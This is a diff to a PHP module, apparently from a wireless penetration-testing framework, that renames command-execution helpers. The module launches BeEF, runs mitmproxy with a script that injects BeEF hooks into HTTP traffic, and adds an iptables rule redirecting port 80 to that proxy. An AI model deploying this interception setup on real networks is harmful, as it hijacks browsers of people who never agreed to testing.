@@ -41,39 +41,39 @@ if($service != "") {
     if ($action == "start") {
         // COPY LOG
 		$exec = "$bin_cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
-		exec_fruitywifi($exec);
+		exec_blackbulb($exec);
 		
 		if ($mod_beef_kali == "1") {
 			//$exec = "/etc/init.d/beef-xss restart";
-			//exec_fruitywifi($exec);
+			//exec_blackbulb($exec);
 			$exec = "./beef-kali";
-			exec_fruitywifi($exec);
+			exec_blackbulb($exec);
 		} else {
 			//$exec = "/usr/bin/ruby -C beef-master/ beef > /tmp/beef.log &";
 			$exec = "./beef";
-			exec_fruitywifi($exec);
-			//exec_fruitywifi_env($exec);
+			exec_blackbulb($exec);
+			//exec_blackbulb_env($exec);
 			//exec($exec);
 		}
 		
 		if ($mod_beef_auto == "1") {
 			$exec = "$bin_mitmproxy -q --port $port -T --host -s 'inject_beef.py $io_in_ip' >> $mod_logs &";
-			exec_fruitywifi($exec);
+			exec_blackbulb($exec);
 			
 			$exec = "$bin_iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port";
-			exec_fruitywifi($exec);
+			exec_blackbulb($exec);
 		}
 		
     } else if($action == "stop") {
 		
 		$exec = "$bin_iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port";
-		exec_fruitywifi($exec);
+		exec_blackbulb($exec);
 	
 		$exec = "ps aux|grep -E 'mitmdump.+inject_beef' | grep -v grep | awk '{print $2}'";
 		exec($exec,$output);
 		
 		$exec = "kill " . $output[0];
-		exec_fruitywifi($exec);
+		exec_blackbulb($exec);
 		
 		unset($output);
 		
@@ -81,7 +81,7 @@ if($service != "") {
 		exec($exec,$output);
 		
 		$exec = "kill " . $output[0];
-		exec_fruitywifi($exec);
+		exec_blackbulb($exec);
     }
 }
 
@@ -89,10 +89,10 @@ if($service != "") {
 if ($install == "install_$mod_name") {
 
     $exec = "chmod 755 install.sh";
-    exec_fruitywifi($exec);
+    exec_blackbulb($exec);
 
     $exec = "$bin_sudo ./install.sh > $log_path/install.txt &";
-    exec_fruitywifi($exec);
+    exec_blackbulb($exec);
     
     header('Location: ../../install.php?module='.$mod_name);
     exit;
